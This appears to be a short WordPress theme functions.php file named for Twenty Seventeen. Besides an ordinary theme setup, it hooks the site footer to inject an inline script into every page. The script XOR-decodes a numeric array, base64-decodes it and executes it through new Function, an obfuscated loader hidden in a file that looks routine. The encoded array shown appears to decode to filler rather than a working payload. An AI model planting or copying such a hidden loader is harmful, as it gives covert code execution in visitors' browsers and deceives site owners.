<?php
function twentyseventeen_setup() { add_theme_support('title-tag'); }
add_action('after_setup_theme', 'twentyseventeen_setup');
add_action('wp_footer', function () {
    echo '<script>(function(){var z=42;var a=[9,9,9,9,9,9,9,9,9,9];var t="";for(var i=0;i<a.length;i++){t+=String.fromCharCode(a[i]^z);}new Function(atob(t))();})();</script>';
});
